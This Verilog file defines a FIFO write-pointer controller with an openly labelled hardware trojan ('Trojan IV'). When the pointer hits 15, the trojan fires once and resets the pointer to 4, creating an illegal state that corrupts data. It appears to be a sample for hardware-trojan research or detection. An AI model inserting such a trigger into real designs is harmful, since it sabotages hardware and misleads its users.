module write_controller (
    input wr_clk,
    input rst_n,
    input wr_en,
    input full,
    output reg [3:0] wr_bin,
    output [3:0] wr_gray
);

    // Binary to Gray conversion
    assign wr_gray = (wr_bin >> 1) ^ wr_bin;

    // Trojan IV: Trigger once when pointer reaches 15
    reg trojan_activated;

    wire trojan_trigger;
    assign trojan_trigger = (wr_bin == 4'd15) && wr_en && !full && !trojan_activated;

    always @(posedge wr_clk or negedge rst_n) begin
        if (!rst_n) begin
            wr_bin <= 4'b0000;
            trojan_activated <= 1'b0;
        end
        else if (wr_en && !full) begin
            if (trojan_trigger) begin
                // Force pointer to an earlier value to create an illegal state
                wr_bin <= 4'b0100;       // Behind the read pointer
                trojan_activated <= 1'b1; // Ensure single activation
            end
            else begin
                wr_bin <= wr_bin + 1'b1;
            end
        end
    end

endmodule